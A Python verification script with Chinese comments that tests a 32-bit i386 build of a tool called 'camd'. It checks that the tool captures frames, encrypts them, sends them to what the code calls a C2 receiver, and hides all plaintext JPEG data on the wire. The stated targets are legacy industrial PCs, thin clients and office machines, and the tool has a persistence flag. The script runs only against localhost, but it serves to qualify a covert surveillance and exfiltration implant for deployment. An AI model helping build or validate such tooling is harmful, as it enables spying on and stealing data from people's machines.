#!/usr/bin/env python3
"""R4c：i386 产物真执行守卫 —— 32 位 x86 目标上的采集 + 回传必须真跑通。

【为什么单独有这条】
  32 位 x86 存量目标仍大量存在（老工控机、瘦客户端、旧办公机）。
  R4 只证明能编出 e_machine=3 的静态产物，能编 ≠ 能跑。

【关键认知修正 —— 此前误判为环境限制】
  前几轮把 R4c 记为 BLOCKED，理由是"qiling 对 x86-32 支持不足"，
  依据是"同目标 hello world 在模拟器下同样 UcError"。
  那个推理漏了一件事：**宿主本身就是 x86_64**，Linux 内核自带 IA32
  compatibility（CONFIG_IA32_EMULATION），32 位静态 ELF 可以**原生执行**，
  根本不需要任何模拟器。
  实测：`./artifacts/camd-i386-musl --help` 直接 RC=0。
  所以这不是环境限制，是排查路径选错了 —— 记在这里防止再退回。

【判据】
  正向：静态/machine=3/原生可执行/端到端回传实收字节/线上无 JPEG 明文
  反向：发明文的假程序必须被"无明文"判据抓到（否则该判据恒绿）

【退出码约定 —— 不可混淆】
  0  验证通过
  1  真失败（产物/执行/回传/加密任一不成立）
  2  环境不具备（内核无 IA32 兼容）—— 必须打印，绝不静默通过
"""
import os
import socket
import struct
import subprocess
import sys
import threading
import time

REPO = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
ART = os.path.join(REPO, "artifacts")
BIN = os.path.join(ART, "camd-i386-musl")
ROOTFS = "/tmp/i386root_guard"

FAILS = []
PASSES = []


def ck(name, cond, detail=""):
    if cond:
        PASSES.append(name)
        print("[OK]   %s %s" % (name, detail))
    else:
        FAILS.append(name)
        print("[FAIL] %s %s" % (name, detail))
    return cond


def elf_info(path):
    with open(path, "rb") as f:
        d = f.read(64)
    if d[:4] != b"\x7fELF":
        return None
    cls = d[4]
    machine = struct.unpack("<H", d[18:20])[0]
    return {"class": cls, "machine": machine}


def has_interp(path):
    """有 INTERP 段 = 动态链接，会挑 libc；静态产物不该有。"""
    try:
        out = subprocess.run(["readelf", "-l", path], capture_output=True, timeout=60)
        return b"INTERP" in out.stdout
    except Exception:
        return None


def ia32_supported():
    """宿主能否原生执行 32 位 ELF —— 用被测产物自身 --help 判定，不猜内核配置。

    【踩过的坑】帮助文本走 **stderr** 不是 stdout（实测 stdout 长度 0）。
    若只查 stdout，会把"能原生跑"误判成"内核无 IA32 兼容"，
    于是这条红线会继续躺在 BLOCKED 里 —— 判据错导致红线永久假 BLOCKED。
    """
    try:
        p = subprocess.run([BIN, "--help"], capture_output=True, timeout=60)
        both = p.stdout + p.stderr
        return p.returncode == 0 and b"--sink" in both
    except Exception:
        return False


def run_e2e(binary, port, extra=None):
    """起 TCP 收端，跑被测二进制做采集+回传，返回 (rc, 收到字节, stderr)。"""
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", port))
    srv.listen(4)
    buf = bytearray()
    stop = [False]

    def acc():
        while not stop[0]:
            try:
                srv.settimeout(1.0)
                c, _ = srv.accept()
            except Exception:
                if stop[0]:
                    return
                continue
            while True:
                try:
                    d = c.recv(65536)
                except Exception:
                    break
                if not d:
                    break
                buf.extend(d)
            c.close()

    t = threading.Thread(target=acc, daemon=True)
    t.start()

    key = os.urandom(32).hex()
    cmd = [binary, "--sink", "tcp://127.0.0.1:%d" % port, "--key", key,
           "--backend", "mock", "--no-persist", "--root", ROOTFS,
           "--capture-ms", "300", "--frames", "4",
           "--interval-ms", "50", "--batches", "2"]
    if extra:
        cmd = extra
    try:
        p = subprocess.run(cmd, capture_output=True, timeout=120)
        rc, err = p.returncode, p.stderr.decode("utf8", "replace")
    except subprocess.TimeoutExpired as e:
        rc, err = -1, "TIMEOUT: %s" % (e.stderr or b"").decode("utf8", "replace")[-300:]
    time.sleep(0.8)
    stop[0] = True
    try:
        srv.close()
    except Exception:
        pass
    t.join(timeout=3)
    return rc, bytes(buf), err


def main():
    # ---- 环境探测：不具备必须打印并退出 2，绝不静默通过 ----
    if not os.path.exists(BIN):
        print("[环境不具备] 产物缺失: %s（先跑 scripts/build_cross.sh）" % BIN)
        return 2
    if not ia32_supported():
        print("[环境不具备] 宿主无法原生执行 32 位 ELF（内核无 IA32 兼容）")
        return 2

    info = elf_info(BIN)
    ck("F1 产物为 32 位 ELF", info is not None and info["class"] == 1,
       "class=%s" % (info and info["class"]))
    ck("F2 e_machine=3(i386)", info is not None and info["machine"] == 3,
       "machine=%s" % (info and info["machine"]))
    interp = has_interp(BIN)
    ck("F3 静态链接（无 INTERP，不挑 libc）", interp is False,
       "INTERP=%s" % interp)
    ck("F4 宿主原生可执行 i386 字节（无需模拟器）", ia32_supported())

    port = 45902
    rc, data, err = run_e2e(BIN, port)
    ck("F5 i386 产物端到端退出码 0", rc == 0, "rc=%s" % rc)
    ck("F6 C2 实收字节（采集+编码+加密+回传全通）", len(data) > 0,
       "%d 字节" % len(data))
    ck("F7 线上无 JPEG 明文（FFD8FF）", len(data) > 0 and b"\xff\xd8\xff" not in data,
       "含 magic=%s" % (b"\xff\xd8\xff" in data))
    if len(data):
        vals = len(set(data[:20000]))
        ck("F8 密文特征（字节值多样性 > 100）", vals > 100, "%d 种取值" % vals)

    # ---- 反向：发明文的假程序必须被 F7 抓到，否则 F7 恒绿 ----
    fake = "/tmp/fake_plain_i386.py"
    with open(fake, "w") as f:
        f.write("#!/usr/bin/env python3\n"
                "import socket, sys\n"
                "s = socket.create_connection(('127.0.0.1', %d), timeout=8)\n"
                "s.sendall(b'\\xff\\xd8\\xff\\xe0' + b'\\x00' * 4096)\n"
                "s.close()\n" % 45903)
    os.chmod(fake, 0o755)
    srv2 = socket.socket()
    srv2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv2.bind(("127.0.0.1", 45903))
    srv2.listen(4)
    b2 = bytearray()

    def acc2():
        try:
            srv2.settimeout(8.0)
            c, _ = srv2.accept()
            while True:
                d = c.recv(65536)
                if not d:
                    break
                b2.extend(d)
            c.close()
        except Exception:
            pass

    t2 = threading.Thread(target=acc2, daemon=True)
    t2.start()
    try:
        subprocess.run([fake], capture_output=True, timeout=30)
    except Exception:
        pass
    t2.join(timeout=10)
    try:
        srv2.close()
    except Exception:
        pass
    caught = len(b2) > 0 and b"\xff\xd8\xff" in bytes(b2)
    ck("R1 反向：发明文的假程序必须被「无明文」判据抓到",
       caught, "收端 %d 字节，含 magic=%s" % (len(b2), b"\xff\xd8\xff" in bytes(b2)))

    # ---- 反向2：产物损坏必须被判失败，否则 F5 恒绿 ----
    bad = "/tmp/camd_i386_broken"
    with open(BIN, "rb") as f:
        head = f.read(4096)
    with open(bad, "wb") as f:
        f.write(head[:40] + b"\x00" * 16 + head[56:])
    os.chmod(bad, 0o755)
    try:
        pb = subprocess.run([bad, "--help"], capture_output=True, timeout=30)
        broken_ok = pb.returncode == 0 and b"--sink" in (pb.stdout + pb.stderr)
    except Exception:
        broken_ok = False
    ck("R2 反向：损坏产物不得再判为可执行", not broken_ok)

    # ---- 指纹：产物变了，本证据即失效 ----
    import hashlib
    with open(BIN, "rb") as f:
        h = hashlib.sha256(f.read()).hexdigest()
    print("# ---- 产物指纹（产物变了，本证据即失效）----")
    print("HASH i386 %s %d" % (h, os.path.getsize(BIN)))

    print("")
    print("=== result: %d pass, %d fail ===" % (len(PASSES), len(FAILS)))
    if FAILS:
        print("失败项: %s" % ", ".join(FAILS))
    return 1 if FAILS else 0


if __name__ == "__main__":
    if not os.path.exists(ROOTFS):
        os.makedirs(ROOTFS, exist_ok=True)
    sys.exit(main())
